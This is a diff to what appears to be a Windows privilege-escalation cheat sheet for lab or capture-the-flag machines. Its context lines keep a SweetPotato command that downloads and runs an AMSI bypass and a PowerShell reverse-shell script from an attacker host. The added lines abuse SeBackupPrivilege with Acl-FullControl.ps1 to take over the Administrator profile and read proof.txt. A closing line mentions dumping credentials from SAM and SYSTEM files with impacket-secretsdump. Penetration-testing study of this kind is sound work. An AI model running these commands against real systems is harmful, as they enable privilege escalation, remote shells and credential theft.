@@ -348,6 +348,13 @@ Sweetpotato examples:
 ./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
 ```
 
+**SeBackupPrivilege**:
+https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
+```shell
+Import-Module .\Acl-FullControl.ps1
+Acl-FullControl -user vault\anirudh -path C:\Users\Administrator -
+type C:\Users\Administrator\Desktop\proof.txt
+```
 #### SAM, Security and System files
 
 With this files we can dump credentials using impacket-secretsdump. We can get this files if we are admins or maybe check for folders like windows.old and check there inside .\\Windows\\System32 folder
